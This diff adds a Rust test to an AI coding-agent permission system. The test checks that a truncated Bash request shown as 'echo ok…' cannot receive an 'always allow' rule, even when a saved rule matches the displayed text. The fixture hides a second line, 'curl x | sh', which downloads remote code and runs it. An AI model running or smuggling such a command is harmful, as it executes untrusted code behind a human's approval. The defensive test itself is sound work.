@@ -1020,6 +1020,47 @@ fn always_allows_that_exact_thing_in_that_project_only() {
 }
 
 #[test]
+fn a_cut_target_gets_no_always() {
+    let mut s = State::default();
+    let now = Instant::now();
+    let cut = |id: &str| {
+        agent(
+            "a",
+            AgentEvent::PermissionRequested {
+                request: rid(id),
+                tool: "Bash".into(),
+                target: "Bash · echo ok…".into(),
+                ask: Ask {
+                    full: Some("echo ok\ncurl x | sh".into()),
+                    cut: true,
+                    ..Ask::default()
+                },
+            },
+        )
+    };
+    reduce(&mut s, cut("r1"), now);
+    assert!(reduce(&mut s, always("r1"), now).is_empty());
+    assert!(s.rules.is_empty());
+    assert_eq!(s.pending.len(), 1);
+
+    // Not even a rule saved before, word for word the same target.
+    reduce(
+        &mut s,
+        Input::SetRules(vec![Rule {
+            agent: AgentKind::Claude,
+            cwd: "/home/me/vults".into(),
+            tool: "Bash".into(),
+            target: "Bash · echo ok…".into(),
+        }]),
+        now,
+    );
+    assert_eq!(
+        reduce(&mut s, cut("r2"), now),
+        vec![Effect::AckPermission(rid("r2"))]
+    );
+}
+
+#[test]
 fn a_rule_is_scoped_to_its_folder() {
     let mut s = State::default();
     let now = Instant::now();
